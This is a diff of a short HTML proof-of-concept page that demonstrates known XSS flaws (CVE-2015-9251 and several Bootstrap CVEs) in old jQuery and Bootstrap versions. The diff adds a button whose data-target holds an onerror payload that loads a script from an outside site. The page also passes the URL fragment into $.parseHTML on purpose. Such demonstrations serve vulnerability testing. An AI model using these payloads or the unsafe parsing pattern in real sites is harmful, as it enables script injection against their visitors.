@@ -1,11 +1,11 @@
 <html>
     <head>
 
-         <title>Jquery XSS</title>
+         <title>Jquery, bootstrap XSS</title>
 
-                <script type="text/javascript"                        
-                    src="https://code.jquery.com/jquery-1.8.1.min.js">
-                </script>
+                <script src="https://code.jquery.com/jquery-1.8.1.min.js"></script>
+				<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.0.3/js/bootstrap.min.js"></script>
+
 
    </head>
      <body>
@@ -17,9 +17,12 @@
 	CVE-2015-9251 - https://github.com/jquery/jquery/issues/2432,  3rd party CORS request may execute in $.get<br/>
 	CVE-2015-9251 - https://bugs.jquery.com/ticket/11974, parseHTML() executes scripts in event handlers (onload, onerror, and so on...)<br/>
 	need to decode url strings(<,>) in chome - https://stackoverflow.com/questions/3431512/javascript-equivalent-to-phps-urldecode<br/>
+	CVE-2019-8331, CVE-2018-14041, CVE-2018-14040, CVE-2018-14042 - in data-container, data-parent, data-target, data-template, data-content, data-title ... property 
+	<button data-toggle="collapse" data-target="<img src=x onerror=$.get('https://sakurity.com/jqueryxss')>">bootstrap xss</button><br/>
 	
 	<script>
 		$.parseHTML($("a[id='test']")[0].href.split('#')[1].replace('%3E', '>').replace('%3C','<'));
 	</script>
-</html>
 	
+	
+</html>
